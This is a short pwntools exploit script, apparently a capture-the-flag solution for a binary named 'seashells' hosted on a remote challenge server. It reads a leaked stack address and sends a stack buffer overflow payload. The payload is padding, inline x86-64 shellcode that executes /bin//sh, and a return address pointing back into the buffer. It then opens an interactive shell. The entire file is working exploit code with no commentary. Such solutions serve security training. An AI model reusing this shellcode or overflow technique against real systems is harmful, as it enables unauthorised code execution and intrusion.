from pwn import *

#p = gdb.debug("./seashells")
#p = process("./seashells")
p = remote("0.cloud.chals.io", 22808)

addr = p.recvline().decode().split()[-1]
addr = int(addr[2:],16)
print("addr", hex(addr))

payload = b'A'*24
payload += b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
payload += b'A'*20
payload += p64(addr+24)
#gdb.attach(p)
p.sendline(payload)

p.interactive()
